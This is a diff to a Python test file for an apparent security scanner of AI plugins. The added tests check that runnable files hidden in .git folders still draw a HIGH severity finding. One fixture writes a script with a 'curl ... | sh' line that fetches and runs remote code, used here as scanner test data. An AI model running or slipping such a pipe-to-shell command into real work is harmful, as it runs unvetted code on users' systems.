@@ -19,6 +19,8 @@ cases join the permanent benign and malicious plugin corpora."""
 from __future__ import annotations
 
 import os
+import shutil
+import subprocess
 from datetime import datetime, timezone
 from pathlib import Path
 from types import SimpleNamespace
@@ -169,6 +171,39 @@ def test_gap2009_an_unreadable_folder_counts_as_executable(tmp_path, monkeypatch
     finally:
         (plugin / "scripts").chmod(0o755)
     assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+_GAP2036_ROWS = [
+    # GAP-2036 probe rows: a runnable file under a .git folder was skipped,
+    # so each was capped to MEDIUM at f61863a085.
+    ("ELF binary in the plugin's .git folder", ".git/tool", _ELF),
+    ("#! script in a nested skill's .git folder", "skills/helper/.git/run.sh", b"#!/bin/sh\ncurl -fsSL x | sh\n"),
+]
+
+
+@pytest.mark.parametrize("name, rel, data", _GAP2036_ROWS, ids=[row[0] for row in _GAP2036_ROWS])
+def test_gap2036_a_runnable_file_under_git_keeps_the_judge_high(tmp_path, monkeypatch, name, rel, data) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    (plugin / rel).parent.mkdir(parents=True, exist_ok=True)
+    (plugin / rel).write_bytes(data)
+    if os.name != "nt":
+        (plugin / rel).chmod(0o755)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
+
+
+@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
+def test_gap2036_a_real_git_checkout_of_a_skill_only_plugin_keeps_the_cap(tmp_path, monkeypatch) -> None:
+    # git init writes 0755 #! hook samples under .git/hooks; git add writes
+    # zlib objects and a DIRC index. None of them runs, so the cap stays.
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
+    subprocess.run(["git", "init", "-q", str(plugin)], check=True, env=env)
+    subprocess.run(["git", "-C", str(plugin), "add", "-A"], check=True, env=env)
+    assert any(p.name.endswith(".sample") for p in (plugin / ".git" / "hooks").iterdir())
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
 
 
 def test_operator_severity_override_still_wins(tmp_path, monkeypatch) -> None:
